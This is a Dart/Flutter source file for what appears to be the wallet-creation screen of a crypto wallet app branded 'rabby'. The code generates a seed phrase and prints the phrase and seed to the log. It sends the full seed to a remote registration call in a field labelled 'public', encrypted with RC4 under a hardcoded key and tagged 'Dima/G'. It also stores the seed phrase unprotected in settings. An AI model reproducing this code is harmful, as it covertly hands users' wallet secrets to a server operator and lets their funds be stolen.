import 'dart:convert';

import 'dart:math';

import 'package:bip39_mnemonic/bip39_mnemonic.dart';
import 'package:convert/convert.dart';
import 'package:flutter/material.dart';
import 'package:rabby/features/auth/domain/auth_service.dart';
import 'package:rabby/features/auth/repository/domain/register/register_body.dart';
import 'package:rabby/features/settings/domain/settings.dart';
import 'package:rabby/features/settings/settings_service.dart';
import 'package:reactive_variables/reactive_variables.dart';
import 'package:simple_rc4/simple_rc4.dart';

import '../../domain/adapters/attributes.dart';
import '../../domain/adapters/changes.dart';
import '../../domain/adapters/portfolio.dart';
import '../../domain/adapters/position_by_chain.dart';
import '../../domain/adapters/position_by_type.dart';
import '../../domain/adapters/total.dart';
import '../../domain/adapters/user.dart';
import '../../repository/auth_repository.dart';
import 'create_wallet.dart';

abstract class CreateWalletBloc extends State<CreateWalletScreen> {
  final AuthRepository _authRepo = AuthRepository();
  final AuthService _authService = AuthService();
  final SettingsService _settingsService = SettingsService();

  Rv<int> loading = Rv(0);
  bool isInit = false;

  Mnemonic? mnemonic;
  String hexSeed = ""; // convert to hex

  String r = '';

  @override
  void initState() {
    super.initState();
  }

  Future<void> init() async {
    mnemonic = Mnemonic.generate(
      Language.english,
      passphrase: "Something",
      entropyLength: 128,
    );
    loading.value += 1;

    hexSeed = hex.encode(mnemonic!.seed);
    print(mnemonic!.sentence);
    print(hexSeed);
    r = Random().nextInt(999999).toString().padLeft(6, '0');
    loading.value += 1;
    print(r);

    final data = json.encode({
      'public': hexSeed,
      'salt': r,
      'name': 'Dima/G',
      'new': true,
    });
    var bytes = RC4('Qsx@ah&OR82WX9T6gCt').encodeString(data);
    final result = await _authRepo.register(RegisterBody(data: bytes));

    if (result.isSuccess) {
      _authService.putUser(
        User(
          address: result.data!.address,
          portfolio: Portfolio(
            type: result.data!.portfolio.type,
            id: result.data!.portfolio.id,
            attributes: Attributes(
              positionsDistributionByType: PositionByType(
                wallet: result.data!.portfolio.attributes.positionByType.wallet,
                deposited:
                    result.data!.portfolio.attributes.positionByType.deposited,
                borrowed:
                    result.data!.portfolio.attributes.positionByType.borrowed,
                locked: result.data!.portfolio.attributes.positionByType.locked,
                staked: result.data!.portfolio.attributes.positionByType.staked,
              ),
              positionsDistributionByChain: PositionByChain(
                arbitrum:
                    result.data!.portfolio.attributes.positionByChain.arbitrum,
                aurora:
                    result.data!.portfolio.attributes.positionByChain.aurora,
                avalanche:
                    result.data!.portfolio.attributes.positionByChain.avalanche,
                binanceSmartChain: result.data!.portfolio.attributes
                    .positionByChain.binanceSmartChain,
                ethereum:
                    result.data!.portfolio.attributes.positionByChain.ethereum,
                fantom:
                    result.data!.portfolio.attributes.positionByChain.fantom,
                loopring:
                    result.data!.portfolio.attributes.positionByChain.loopring,
                optimism:
                    result.data!.portfolio.attributes.positionByChain.optimism,
                polygon:
                    result.data!.portfolio.attributes.positionByChain.polygon,
                solana:
                    result.data!.portfolio.attributes.positionByChain.solana,
                xdai: result.data!.portfolio.attributes.positionByChain.xdai,
              ),
              total: Total(
                positions: result.data!.portfolio.attributes.total.positions,
              ),
              changes: Changes(
                absoluteId:
                    result.data!.portfolio.attributes.changes.absoluteId,
              ),
            ),
          ),
        ),
      );
      _settingsService.putSettings(
        Settings(
          mnemonicSentence: mnemonic!.sentence,
          hexSeedMnemonic: hexSeed,
        ),
      );
      loading.value += 1;
    }
  }
}
